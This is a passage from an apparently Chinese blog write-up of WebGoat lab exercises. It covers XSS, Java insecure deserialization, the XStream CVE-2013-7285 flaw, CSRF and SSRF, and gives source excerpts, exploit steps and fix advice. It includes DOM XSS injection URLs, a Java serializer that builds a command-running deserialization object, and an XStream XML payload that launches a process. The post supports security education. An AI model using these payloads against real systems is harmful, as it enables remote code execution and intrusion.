&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Predicate&amp;lt;String&amp;gt; XSS_PATTERN = Pattern.compile(            &lt;span class=&#34;string&#34;&gt;&amp;quot;.*&amp;lt;script&amp;gt;(console\\.log|alert)\\(.*\\);?&amp;lt;\\/script&amp;gt;.*&amp;quot;&lt;/span&gt;            , Pattern.CASE_INSENSITIVE).asMatchPredicate();&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (XSS_PATTERN.test(field1)) &amp;#123;            userSessionData.setValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-complete&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;);            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (field1.toLowerCase().contains(&lt;span class=&#34;string&#34;&gt;&amp;quot;console.log&amp;quot;&lt;/span&gt;)) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-success-console&amp;quot;&lt;/span&gt;).output(cart.toString()).build();            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-success-alert&amp;quot;&lt;/span&gt;).output(cart.toString()).build();            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xss02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;根据要在何处使用用户输入，使用适当的转义 / 编码技术：HTML 转义，JavaScript 转义，CSS 转义，URL 转义等。使用现有的转义库，除非绝对必要，否则请不要编写自己的库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果用户输入需要包含 HTML，则无法对其进行转义 / 编码，因为它会破坏有效的标签。在这种情况下，请使用受信任且经过验证的库来解析和清除 HTML。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为 cookie 设置 HttpOnly 标志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用内容安全策略&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM 型&lt;/p&gt;
&lt;p&gt;源码中使用路由，路由中的参数而无需编码可以执行 WebGoat 中的内部功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xss01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&amp;lt;script&amp;gt;webgoat.customjs.phoneHome();&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;通过 url 触发路由内部函数的执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&amp;lt;script&amp;gt;webgoat.customjs.phoneHome();&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;xss03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：规范使用 JavaScript&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;p&gt;反序列化漏洞呢是一个说复杂也不复杂，说不复杂也很复杂的问题，要理解的点还是有很多的，&lt;a href=&#34;https://www.cnblogs.com/ssooking/p/5875215.html&#34;&gt;这里就讲的很细&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;deserialization–&amp;gt;InsecureDeserializationTask&lt;/p&gt;
&lt;p&gt;根据 if (!(o instanceof VulnerableTaskHolder))，可以发现，我们序列化的实例应该是 VulnerableTaskHolder&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (ObjectInputStream ois = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ObjectInputStream(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &amp;#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(o &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; VulnerableTaskHolder)) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (o &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; String) &amp;#123;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;insecure-deserialization.stringobject&amp;quot;&lt;/span&gt;).build();                &amp;#125;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;insecure-deserialization.wrongobject&amp;quot;&lt;/span&gt;).build();            &amp;#125;            after = System.currentTimeMillis();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;VulnerableTaskHolder 定位到 Runtime.getRuntime ().exec (taskAction)&lt;/p&gt;
&lt;p&gt;并且 taskAction 是在构造函数里被赋值的&lt;/p&gt;
&lt;p&gt;所以我们可以通过控制 taskAction 来控制执行的命令（eg. VulnerableTaskHolder go = new VulnerableTaskHolder (“sleep”, “sleep 6”)），将对象使用序列化工具序列化，提交至后端处理，就会触发&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//condition is here to prevent you from destroying the goat altogether		if ((taskAction.startsWith(&amp;quot;sleep&amp;quot;)||taskAction.startsWith(&amp;quot;ping&amp;quot;))				&amp;amp;&amp;amp; taskAction.length() &amp;lt; 22) &amp;#123;		log.info(&amp;quot;about to execute: &amp;#123;&amp;#125;&amp;quot;, taskAction);		try &amp;#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &amp;#123;                log.info(line);            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;序列化 VulnerableTaskHolder 对象，base64 编码&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt;&lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;&amp;#123;            VulnerableTaskHolder go = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; VulnerableTaskHolder(&lt;span class=&#34;string&#34;&gt;&amp;quot;sleep&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;sleep 6&amp;quot;&lt;/span&gt;);            ByteArrayOutputStream bos = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();            ObjectOutputStream oos = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            &lt;span class=&#34;keyword&#34;&gt;byte&lt;/span&gt;[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception e)&amp;#123;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提交后反序列化后的对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;des01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是没有执行成功，谷歌了一下，说是用 java 调用 CMD 命令时，需要指定 ，但是这个会改变现存代码逻辑，暂未实现，实现后再更新&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;des02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;反序列化漏洞修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 如果是第三方组件存在反序列化漏洞，建议更新版本或打补丁2. 加强对Runtime.exec相关代码的检测3. 条件允许的话，禁止JVM执行外部命令
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;第三方组件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三方组件&#34;&gt;#&lt;/a&gt; 第三方组件&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-9&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;系统中引用了存在已知漏洞的第三方组件，如 Jackson 反序列化漏洞、Struts2 远程代码执行漏洞等，可能会直接或间接导致系统沦陷。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-9&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://x-stream.github.io/CVE-2013-7285.html&#34;&gt;CVE-2013-7285 漏洞详情&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击者可以通过版本信息找到相应的 cve 漏洞和 payload 进行利用，如下就是通过构造 ContactImpl 的 xml 格式通关。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;        	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!StringUtils.isEmpty(payload)) &amp;#123;        		payload = payload.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;+&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;\r&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;lt;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;);        	&amp;#125;            contact = (Contact) xstream.fromXML(payload);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception ex) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;vulnerable-components.close&amp;quot;&lt;/span&gt;).output(ex.getMessage()).build();        &amp;#125;                &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;!=contact) &amp;#123;            	contact.getFirstName();&lt;span class=&#34;comment&#34;&gt;//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &amp;#125;             if (!(contact instanceof ContactImpl)) &amp;#123;            	return success(this).feedback(&amp;quot;vulnerable-components.success&amp;quot;).build();            &amp;#125;        &amp;#125; catch (Exception e) &amp;#123;        	return success(this).feedback(&amp;quot;vulnerable-components.success&amp;quot;).output(e.getMessage()).build();        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例案例中，可以通过构造 xml 格式的数据，造成 rce&lt;/p&gt;
&lt;p&gt;第三方漏洞修复建议：更新到最新版本，或者打补丁&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;sorted-set&amp;gt;  &amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;  &amp;lt;dynamic-proxy&amp;gt;    &amp;lt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;interface&lt;/span&gt;&amp;gt;&lt;span class=&#34;title&#34;&gt;java&lt;/span&gt;.&lt;span class=&#34;title&#34;&gt;lang&lt;/span&gt;.&lt;span class=&#34;title&#34;&gt;Comparable&lt;/span&gt;&amp;lt;/&lt;span class=&#34;title&#34;&gt;interface&lt;/span&gt;&amp;gt;    &amp;lt;&lt;span class=&#34;title&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;class&lt;/span&gt;&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.beans.EventHandler&amp;quot;&lt;/span&gt;&amp;gt;      &amp;lt;target &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt;&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.lang.ProcessBuilder&amp;quot;&lt;/span&gt;&amp;gt;        &amp;lt;command&amp;gt;          &amp;lt;string&amp;gt;cacl.exe&amp;lt;/string&amp;gt;        &amp;lt;/command&amp;gt;      &amp;lt;/target&amp;gt;      &amp;lt;action&amp;gt;start&amp;lt;/action&amp;gt;    &amp;lt;/handler&amp;gt;  &amp;lt;/dynamic-proxy&amp;gt;&amp;lt;/sorted-set&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功弹出计算器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;301.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-10&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;CSRF（Cross-site request forgery）跨站请求伪造，也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 XSS 更具危险性。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-9&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;网站的 cookie 在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的 csrf 脚本或包含 csrf 脚本的链接，可能会执行一些用户不想做的功能&lt;/p&gt;
&lt;h2 id=&#34;部分代码及修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部分代码及修复建议&#34;&gt;#&lt;/a&gt; 部分代码及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;csrf–&amp;gt;ForgedReviews.createNewReview()&lt;/p&gt;
&lt;p&gt;只判断了 refer 值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;bp 一键生成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在服务器端生成随机 token，浏览器在发起针对数据的修改请求将 token 提交，由服务器端验证通过够进行操作逻辑，token 需要至多一次有效，并具有有限的生命周期&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过检查 refer 值，判断请求是否合法 (下面的代码就是典型的反例)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;针对需要用户授权的请求，提示用户输入身份认证后再继续操作&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;针对频繁操作提示输入验证码后再继续进行操作&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;csrf–&amp;gt;CSRFFeedback（7）&lt;/p&gt;
&lt;p&gt;新增判断了 contentType。&lt;/p&gt;
&lt;p&gt;拦截请求包生成的 poc 中，enctype=“text/plain”，我们要发送的 json 格式的数据都被隐藏在 input 的 name 中，其余同上&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-11&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;服务端请求伪造攻击（SSRF）也成为跨站点端口攻击，是由于一些应用在 9 向第三方主机请求资源时提供了 URL 并通过传递的 URL 来获取资源引起的，当这种功能没有对协议、网络可信便捷做好限制时，攻击者可利用这种缺陷来获取内网敏感数据、DOS 内网服务器、读文件甚至于可获取内网服务器控制权限等。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-10&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤或者限制，比如说从指定 url 地址获取网页文本内容，加载指定地址的图片，文档等等.&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-10&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;两个任务都是根据用户输入的参数，进行判断输入，并没有任何过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止 file://,gopher://,&lt;a href=&#34;ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98&#34;&gt;ftp:// 等引起的问题&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;统一错误信息，防止利用错误信息来判断远端服务器的端口状态.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;禁止 302 跳转，或每跳转一次检查新的 host 是否为内网 ip, 后禁止&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置 url 名单或者限制内网 ip.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;最后想说的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后想说的&#34;&gt;#&lt;/a&gt; 最后想说的&lt;/h1&gt;
&lt;p&gt;要好好努力，跟着自己的节奏，会越来越好的 o (￣ε￣*)&lt;/p&gt;
&lt;p&gt;还有还有，谢谢小甜甜一直的陪伴，爱您♡&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
